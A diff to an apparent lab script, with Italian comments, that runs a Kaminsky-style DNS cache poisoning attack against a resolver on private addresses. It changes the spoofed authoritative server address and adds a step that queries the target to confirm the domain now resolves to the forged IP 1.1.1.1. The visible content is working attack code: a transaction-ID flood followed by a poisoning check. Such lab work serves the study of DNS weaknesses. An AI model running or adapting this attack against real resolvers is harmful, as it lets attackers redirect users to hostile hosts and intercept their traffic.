@@ -5,7 +5,7 @@ import random
 import string
 
 target_dns = "10.9.0.53"
-auth_dns = "10.9.1.153"
+auth_dns = "10.9.0.153"
 target_port = 33333
 
 # 1. Generiamo un prefisso casuale per aggirare la cache
@@ -42,3 +42,10 @@ for txid in range(0, 65535):
     s.send(raw_bytes)
 
 print(f"[+] Kaminsky flood complete for {domain}!")
+
+print("[*] 3. Verifying cache poisoning...")
+verification = sr1(IP(dst=target_dns)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=domain)), timeout=3, verbose=0)
+if verification and verification.haslayer(DNS) and verification.an and verification.an.rdata == "1.1.1.1":
+    print(f"[+] Verification SUCCESS: {domain} resolves to 1.1.1.1")
+else:
+    print(f"[-] Verification FAILED: {domain} did not resolve to the fake IP")
